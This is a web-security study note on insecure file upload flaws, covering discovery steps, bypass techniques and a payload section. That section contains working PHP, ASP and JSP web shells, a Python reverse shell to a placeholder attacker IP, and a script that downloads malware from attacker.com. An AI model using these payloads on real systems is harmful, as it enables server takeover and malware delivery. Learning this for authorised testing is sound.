# Index
- [[Back End Vulnerabilities]]
	- [[1. Insecure File Uploads]]
	- [[2. File Inclusion]]
	- [[3. Command Injection]]
	- [[4. SQL Injection (SQLi)]]
	- [[5. Server-Side Request Forgery (SSRF)]]
	- [[6. Server-Side Template Injection (SSTi)]]
	- [[7. XML External Entity (XXE)]]
	- [[8. Insecure Deserialization]]

# Insecure File Uploads

Insecure File Uploads refer to vulnerabilities in web applications that allow an attacker to upload malicious files onto a server without proper validation or security controls. These vulnerabilities can be exploited to perform a variety of attacks, such as remote code execution, cross-site scripting (XSS), privilege escalation, or even full system compromise. In a secure implementation, file uploads should be restricted to certain types of files, with checks on both the file's content and its metadata (e.g., file extension or MIME type). However, many applications implement weak or improper validation mechanisms, allowing attackers to bypass these restrictions and upload harmful files.

# How Insecure File Uploads Work

Insecure File Uploads typically follow a few main steps where the vulnerability is introduced and exploited. Here's a breakdown of how it works:

1. **File Upload Interface:** The attacker identifies an interface in the web application that accepts file uploads, such as an image uploader or document attachment feature.   
2. **Weak Validation:** The application might only validate file uploads based on filename extensions (e.g., `.jpg`, `.png`) or MIME types, rather than performing deep inspection of the file contents. This allows attackers to craft malicious files that appear legitimate based on superficial checks.
3. **Upload of Malicious File:** The attacker uploads a malicious file, such as a web shell or a script in a language supported by the web server (e.g., PHP, ASP, Python, etc.). This file is often disguised as an image, document, or other benign file types.
4. **File Placement:** The server stores the uploaded file in a location that is accessible via the web. If the file can be accessed directly through a URL, this gives the attacker the ability to interact with the uploaded malicious file.
5. **Execution of Malicious Code:** Once the file is uploaded and accessible via a URL, the attacker navigates to that file's URL, triggering the execution of the malicious code. Depending on the server’s configuration, this code could be executed with high privileges, potentially giving the attacker full control over the server.

# Types of Insecure File Uploads
Insecure File Upload vulnerabilities can manifest in different ways. Below are a few common types:

## Unrestricted File Upload
- The server accepts any type of file, allowing attackers to upload executable files such as `.php`, `.asp`, or `.exe` scripts.

### How Unrestricted File Upload Works

1. **Upload:** An attacker uploads a file, such as `shell.php`, containing malicious PHP code.
2. **Storage:** The file is stored on the server without validation.
3. **Execution:** The attacker accesses the file via the web server, causing the PHP code to execute.

## Partial File Validation
- The server performs partial validation (e.g., checking file extensions) but allows attackers to bypass it by renaming malicious files (e.g., `shell.php.jpeg`).

### How Filename Manipulation Works

1. **Upload:** The attacker uploads a file named `shell.php.jpg`. The application checks only the extension and allows the upload, but the server processes it as a PHP file.
2. **Bypass Validation:** The application only checks the `.jpg` extension and allows the upload.
3. **Execution:** The server processes the file based on its actual content, executing the PHP code.

## MIME Type Validation Bypass
- The server checks the MIME type of the file being uploaded but this check can be spoofed by altering HTTP request headers to make the file appear to be of a safe type.

### How MIME Type Validation Bypass Works

1. **Upload:** The attacker modifies the Content-Type header to `image/jpeg` when uploading a PHP file. The application validates the header but stores and processes the file as PHP.
2. **Bypass Validation:** The application trusts the Content-Type header and allows the upload.
3. **Execution:** The server processes the file based on its content, executing the malicious code.

## File Content Validation Failures
- The server may attempt to "sniff" the contents of files for validation but may fail to properly assess the content of complex files (e.g., an image file with embedded script content).

## Path Traversal via File Upload
- Attackers can manipulate file paths to upload files to unintended locations, such as critical directories on the web server (e.g., `/var/www/html`), leading to execution of uploaded files.

### How Path Traversal Works

1. **Upload:** The attacker uploads a file with a path traversal sequence like `../../../../var/www/html/shell.php`, placing the file in a different directory.
2. **Storage:** The application fails to sanitize the path, storing the file in an unintended directory.
3. **Execution:** The attacker accesses the file in the new location, executing the malicious code.

# Manual Discovery Techniques for Insecure File Uploads
There are several methods to manually discover insecure file uploads in a web application. Here's a step-by-step guide using common tools:

## Basic File Upload Test with Burp Suite
   - Use Burp Suite to intercept the file upload request and modify the file type or filename.
   
   - Steps:
     1. Navigate to the file upload feature in the web application.
     2. Intercept the HTTP request using Burp Suite.
     3. Modify the filename to upload a potentially dangerous script (e.g., `shell.php`).
     4. Check the response for any signs of successful file upload or error messages.
     5. Visit the URL where the file might be accessible, typically `/uploads/<filename>`.
   
```
# Intercepting the file upload request with Burp
POST /upload HTTP/1.1
Host: <target_domain>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
```

## Input Field Testing
Manually test file upload forms by attempting to upload various types of files, including scripts, executables, and files with different extensions.

- **Common Payloads:**
    - PHP shell: `shell.php`
    - Double extension: `image.php.jpg`
    - Path traversal: `../../shell.php`

## MIME Type Manipulation via Curl
   - Upload a file with a different MIME type header to bypass validation.
   
   - Steps:
     1. Upload a PHP file disguised as a JPEG.
     2. Modify the MIME type using a tool like `curl`.
   
```
curl -X POST -F "file=@shell.php;type=image/jpeg" http://<target_domain>/upload
```

## Path Traversal Check with File Upload
   - Use path traversal techniques to attempt to upload the file to unintended locations.
   
```bash
POST /upload HTTP/1.1
Host: <target_domain>
Content-Disposition: form-data; name="file"; filename="../../../../../../var/www/html/shell.php"
```

## File Content Validation Bypass
   - Embed executable code within a file that typically isn’t executable, such as an image file.
   - Test upload by embedding a PHP payload in a GIF image:
   
```bash
echo -e "\x47\x49\x46\x38\x39\x61<?php system($_GET['cmd']);?>" > shell.gif
```

# Insecure File Upload Payloads
Below are some examples of common payloads used in Insecure File Upload attacks:

## PHP Web Shell Payload
   - A PHP web shell is a common payload that allows remote code execution:
   
```php
<?php system($_GET['cmd']); ?>
```

```php
<?php passthru($_GET['cmd']); ?>
```

```php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
}
?>
```

   - Access via:
   
```bash
http://<target_domain>/uploads/shell.php?cmd=whoami
```

## ASP Web Shell
   - An ASP web shell is a common payload that allows remote code execution:

```asp
<% eval request("cmd") %>
```
   
   - Access via:
   
```bash
http://<target_domain>/uploads/shell.asp?cmd=whoami
```

## JSP Web Shell:
   - A JSP web shell is a common payload that allows remote code execution:

```jsp
<%@ page import="java.io.*" %>
<%
if (request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream is = p.getInputStream();
    DataInputStream dis = new DataInputStream(is);
    String disr = dis.readLine();
    while (disr != null) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>
```

   - Access via:
   
```bash
http://<target_domain>/uploads/shell.jsp?cmd=whoami
```

## Python Reverse Shell
   - A Python reverse shell script that can be uploaded for remote code execution:
   
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("<attack_ip>",<attack_port>))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

## File Inclusion Payload
Exploits local or remote file inclusion vulnerabilities to execute code on the server.

```php
<?php include($_GET['file']); ?>
```

## Malware Distribution
Uploads malware disguised as legitimate files to infect users who download or execute them.

```xml
<script>
    var a = document.createElement('a');
    a.href = 'http://attacker.com/malware.exe';
    a.download = 'malware.exe';
    document.body.appendChild(a);
    a.click();
</script>
```

# Bypassing Defenses
Bypassing defenses in file upload vulnerabilities requires creativity and an understanding of common validation mechanisms:

## Bypass File Extension Checks
   - Many applications only check file extensions, which can be bypassed by renaming a PHP file with a double extension or null byte:
   
```bash
shell.php.jpg
shell.php%00.jpg  # If the server truncates after null byte
```

## MIME Type Spoofing
   - Change the MIME type in the HTTP request headers to something allowed, like `image/jpeg`:
   
```bash
curl -X POST -F "file=@shell.php;type=image/jpeg" http://<target_domain>/upload
```

## Upload File in Alternate Locations via Path Traversal
   - Exploit path traversal to place files in unintended directories:
   
```bash
POST /upload HTTP/1.1
Content-Disposition: form-data; name="file"; filename="../../../../../../var/www/html/shell.php"
```

## Using Polyglot Files
   - Embed malicious payloads in seemingly legitimate files (e.g., GIF files with embedded PHP):
   
```bash
echo -e "\x47\x49\x46\x38\x39\x61<?php system($_GET['cmd']);?>" > shell.gif
```

# Resources

|**Website**|**URL**|
|-|-|
|OWASP - Unrestricted File Upload|https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload|
|OWASP - Top Ten Security Risks|https://owasp.org/www-project-top-ten/|
|PortSwigger - File Upload Vulnerabilities|https://portswigger.net/web-security/file-upload|
|GitHub - PayloadAllTheThings - File Upload Vulnerabilities|[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure)||OWASP - File Upload Testing Cheat Sheet|https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html|
|GitHub - PayloadAllTheThings - File Upload|[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)|
|GitHub - TheLinuxGuy001 - Insecure File Upload Cheat Sheet|[[https://github.com/thelinuxguy001/insecure_file_upload_cheatsheet](](https://github.com/thelinuxguy001/insecure_file_upload_cheatsheet%5D()[https://github](https://github)|
|Veracode - Secure File Upload Guide|https://www.veracode.com/blog/secure-file-upload-guide|